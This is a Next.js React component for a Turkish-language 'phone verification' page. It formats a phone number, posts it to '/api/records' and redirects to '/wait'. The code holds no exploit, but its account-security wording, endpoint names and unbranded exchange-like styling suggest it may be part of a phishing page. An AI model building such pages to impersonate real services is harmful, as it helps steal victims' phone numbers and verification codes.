"use client"
import { useState } from 'react'
import { useRouter } from 'next/navigation'

const PhoneVerification = () => {
  const router = useRouter()
  const [phone, setPhone] = useState('')
  const [error, setError] = useState('')
  
  // Telefon numarası formatlama
  const formatPhoneNumber = (value: string) => {
    const cleaned = value.replace(/\D/g, '')
    let formatted = cleaned

    if (cleaned.length >= 3) {
      formatted = `(${cleaned.slice(0, 3)}`
      if (cleaned.length >= 6) {
        formatted += `) ${cleaned.slice(3, 6)}`
        if (cleaned.length >= 10) {
          formatted += ` ${cleaned.slice(6, 10)}`
        } else if (cleaned.length > 6) {
          formatted += ` ${cleaned.slice(6)}`
        }
      } else if (cleaned.length > 3) {
        formatted += `) ${cleaned.slice(3)}`
      }
    }

    return formatted
  }

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatPhoneNumber(e.target.value)
    if (formatted.length <= 14) { // (000) 000 0000 = 14 karakter
      setPhone(formatted)
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError('')

    // Telefon numarası validasyonu
    const cleaned = phone.replace(/\D/g, '')
    if (cleaned.length !== 10) {
      setError('Lütfen geçerli bir telefon numarası girin')
      return
    }

    try {
      // API'ye telefon numarasını gönder
      const response = await fetch('/api/records', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          phone: cleaned // Sadece rakamları gönder
        })
      })

      const data = await response.json()

      if (data.success) {
        // Başarılı ise SMS doğrulama sayfasına yönlendir
        router.push('/wait')
      } else {
        setError('Bir hata oluştu. Lütfen tekrar deneyin.')
      }
    } catch (error) {
      console.error('Phone submission error:', error)
      setError('Bir hata oluştu. Lütfen tekrar deneyin.')
    }
  }

  return (
    <div className="min-h-screen bg-[#FAFAFA] flex flex-col items-center justify-center p-4">
      <div className="w-full max-w-[420px] bg-white rounded-lg shadow-sm p-8">
        {/* Header */}
        <h1 className="text-[#1E2329] text-2xl font-medium text-center mb-6">
          Telefon Doğrulama
        </h1>

        {/* Verification Form */}
        <div className="space-y-6">
          <div>
            <h2 className="text-[#1E2329] text-lg font-medium mb-2">Güvenlik doğrulaması</h2>
            <p className="text-[#707A8A] text-sm mb-6">
              Hesabınızı güvence altına almak için lütfen aşağıdaki doğrulamayı tamamlayın.
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <label className="block text-[#707A8A] text-sm mb-2" htmlFor="phone">
                Telefon Numarası
              </label>
              <input
                id="phone"
                type="text"
                placeholder="(000) 000 0000"
                className="w-full px-0 py-3 border-0 text-black border-b border-gray-200 focus:outline-none focus:border-[#FCD535] text-base transition-colors"
                value={phone}
                onChange={handlePhoneChange}
                maxLength={14}
              />
              {error && (
                <p className="text-[#F6465D] text-sm mt-1">{error}</p>
              )}
            </div>

            <button
              type="submit"
              className="w-full bg-[#FCD535] text-[#1E2329] font-bold rounded-md py-3 hover:bg-[#FCD535]/90 transition"
            >
              Devam Et
            </button>
          </form>
        </div>
      </div>
    </div>
  )
}

export default PhoneVerification